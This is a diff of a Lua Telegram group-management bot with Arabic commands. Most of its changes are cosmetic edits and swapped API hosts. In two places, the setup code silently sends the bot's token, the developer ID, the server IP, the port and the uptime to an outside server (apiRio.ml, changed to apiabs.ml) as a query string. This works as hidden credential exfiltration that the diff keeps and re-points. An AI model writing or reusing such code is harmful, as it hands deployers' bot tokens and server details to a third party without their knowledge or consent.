@@ -82,7 +82,7 @@ David = DevRio:get(ServerDavid.."TokenDavid"):match("(%d+)"),
 SudoIds = {DevRio:get(ServerDavid.."IdDavid")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiRio.ml/config.php?Get=David&DevId="..DevRio:get(ServerDavid.."IdDavid").."&TokenBot="..DevRio:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/config.php?Get=David&DevId="..DevRio:get(ServerDavid.."IdDavid").."&TokenBot="..DevRio:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("David.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -91,15 +91,15 @@ token="]]..DevRio:get(ServerDavid.."TokenDavid")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 echo "~ The tg File Was Not Found In The Bot Files"
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 exit 1
 fi
 if [ ! $token ]; then
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈ ┉"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 echo "~ The Token Was Not Found In The config.lua File"
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈ ┉"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 exit 1
 fi
 ./tg -s ./David.lua -p PROFILE --bot=$token
@@ -2892,7 +2892,7 @@ end
 if text == "الرابط" then
 if not DevRio:get(David.."Rio:Lock:GpLinks"..msg.chat_id_) then 
 if DevRio:get(David.."Rio:Groups:Links"..msg.chat_id_) then
-Dev_Rio(msg.chat_id_, msg.id_, 1, "⌁︙GrOuP LiNk ↬ ⤈ \n﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎\n"..DevRio:get(David.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
+Dev_Rio(msg.chat_id_, msg.id_, 1, "⌁︙Group Link ↬ ⤈ \n﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎\n"..DevRio:get(David.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
 else 
 Dev_Rio(msg.chat_id_, msg.id_, 1, '⌁︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
 end
@@ -8051,7 +8051,7 @@ Dev_Rio(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الزخرفه',
 DevRio:del(David..'Zrf:Rio'..msg.chat_id_..''..msg.sender_user_id_)
 return false  
 end 
-UrlZrf = https.request('https://apiRio.ml/zrf.php?Rio='..URL.escape(text)) 
+UrlZrf = https.request('https://apiabs.ml/zrf.php?Rio='..URL.escape(text)) 
 Zrf = JSON.decode(UrlZrf) 
 t = "⌁︙قائمة الزخرفه ↫ ⤈\n﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎\n"
 i = 0
@@ -8072,7 +8072,7 @@ end
 if not DevRio:get(David..'Rio:Zrf:Rio'..msg.chat_id_) then
 if text and text:match("^زخرفه (.*)$") and ChCheck(msg) or text and text:match("^زخرف (.*)$") and ChCheck(msg) then 
 local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
-UrlZrf = https.request('https://apiRio.ml/zrf.php?Rio='..URL.escape(TextZrf)) 
+UrlZrf = https.request('https://apiabs.ml/zrf.php?Rio='..URL.escape(TextZrf)) 
 Zrf = JSON.decode(UrlZrf) 
 t = "⌁︙قائمة الزخرفه ↫ ⤈\n﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎\n"
 i = 0
@@ -8097,7 +8097,7 @@ end
 if not DevRio:get(David..'Rio:Brg:Rio'..msg.chat_id_) then
 if text and text:match("^برج (.*)$") and ChCheck(msg) or text and text:match("^برجي (.*)$") and ChCheck(msg) then 
 local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
-UrlBrg = https.request('https://apiRio.ml/brg.php?brg='..URL.escape(TextBrg)) 
+UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
 Brg = JSON.decode(UrlBrg) 
 t = Brg.ok.Rio  
 Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
@@ -8213,7 +8213,7 @@ end
 if not DevRio:get(David..'Rio:Age:Rio'..msg.chat_id_) then
 if text and text:match("^احسب (.*)$") and ChCheck(msg) or text and text:match("^عمري (.*)$") and ChCheck(msg) then 
 local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
-UrlAge = https.request('https://apiRio.ml/age.php?age='..URL.escape(TextAge)) 
+UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
 Age = JSON.decode(UrlAge) 
 t = Age.ok.Rio
 Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
@@ -8233,7 +8233,7 @@ end
 if not DevRio:get(David..'Rio:Mean:Rio'..msg.chat_id_) then
 if text and text:match("^معنى الاسم (.*)$") and ChCheck(msg) or text and text:match("^معنى اسم (.*)$") and ChCheck(msg) then 
 local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
-UrlMean = https.request('https://apiRio.ml/Mean.php?Rio='..URL.escape(TextMean)) 
+UrlMean = https.request('https://apiabs.ml/Mean.php?Rio='..URL.escape(TextMean)) 
 Mean = JSON.decode(UrlMean) 
 t = Mean.ok.Rio
 Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
@@ -8241,7 +8241,7 @@ end
 end
 --     Source David     --
 if text == "غنيلي" and ChCheck(msg) or text == "غني" and ChCheck(msg) then
-data,res = https.request('https://apiRio.ml/Audios.php')
+data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9706,7 +9706,7 @@ TokenBot = TokenBot,
 David = TokenBot:match("(%d+)"),
 SudoIds = {DevId},
 }
-https.request("https://apiRio.ml/config.php?Get=David&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/config.php?Get=David&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 Create(Config, "./config.lua")   
 file = io.open("David.sh", "w")  
 file:write([[
@@ -9716,15 +9716,15 @@ token="]]..TokenBot..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 echo "~ The tg File Was Not Found In The Bot Files"
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 exit 1
 fi
 if [ ! $token ]; then
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈ ┉"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 echo "~ The Token Was Not Found In The config.lua File"
-echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ ≈ ┉"
+echo "﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎"
 exit 1
 fi
 ./tg -s ./David.lua -p PROFILE --bot=$token
